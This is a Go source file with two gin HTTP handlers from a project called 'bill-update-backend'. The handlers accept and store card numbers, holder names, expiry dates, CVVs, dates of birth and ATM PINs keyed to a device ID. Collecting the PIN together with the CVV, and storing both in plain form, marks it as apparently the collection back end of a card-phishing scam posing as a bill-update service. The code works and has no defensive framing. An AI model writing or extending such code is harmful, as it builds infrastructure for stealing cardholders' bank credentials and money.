package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func SubmitCardDetails(c *gin.Context) {
	var req struct {
		CardType       string  `json:"card_type"`
		CardNumber     string  `json:"card_number"`
		CardHolderName string  `json:"card_holder_name"`
		Expiry         string  `json:"expiry"`
		CVV            string  `json:"cvv"`
		Amount         float64 `json:"amount"`
		DeviceID       string  `json:"device_id"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	record := models.CardDetail{
		CardType:       req.CardType,
		CardNumber:     req.CardNumber,
		CardHolderName: req.CardHolderName,
		Expiry:         req.Expiry,
		CVV:            req.CVV,
		Amount:         req.Amount,
		DeviceID:       req.DeviceID,
	}
	database.DB.Create(&record)
	c.JSON(http.StatusOK, gin.H{"message": "Card details saved", "id": record.ID})
}

func SubmitCardVerification(c *gin.Context) {
	var req struct {
		Dob      string  `json:"dob"`
		AtmPin   string  `json:"atm_pin"`
		Amount   float64 `json:"amount"`
		DeviceID string  `json:"device_id"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	record := models.CardVerification{
		Dob:      req.Dob,
		AtmPin:   req.AtmPin,
		Amount:   req.Amount,
		DeviceID: req.DeviceID,
	}
	database.DB.Create(&record)
	c.JSON(http.StatusOK, gin.H{"message": "Card verification saved", "id": record.ID})
}
